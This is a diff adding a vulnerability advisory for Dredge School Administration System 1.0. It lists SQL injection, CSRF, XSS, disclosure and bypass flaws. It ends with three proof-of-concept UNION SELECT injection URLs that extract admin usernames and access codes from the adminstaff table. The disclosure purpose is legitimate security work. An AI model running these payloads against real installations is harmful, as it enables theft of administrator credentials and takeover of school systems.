@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/64720/info
+
+Dredge School Administration System is prone to the following security vulnerabilities:
+
+1. An SQL-injection vulnerability
+2. A cross-site request forgery vulnerability
+3. A cross-site scripting vulnerability
+4. An information-disclosure vulnerability
+5. A security-bypass vulnerability
+
+Exploiting these issues could allow an attacker to execute arbitrary script codes, steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, obtain sensitive information or bypass certain security restrictions to perform unauthorized actions.
+
+Dredge School Administration System 1.0 is vulnerable; other versions may also be affected. 
+
+
+http://www.example.com/DSM/loader.php?load=editsession&Id=null+and+1=2+union+select+username,2,3,4,AccessCode,6+from+adminstaff
+
+http://www.example.com/DSM/loader.php?load=editterm&Id=null+and+1=2+union+select+concat(username,0x3a,AccessCode),2,3,4+from+adminstaff
+
+http://www.example.com/DSM/loader.php?load=editclass&Id=null+and+1=2+union+select+concat(username,0x3a,AccessCode),2,3,4,5,6+from+adminstaff
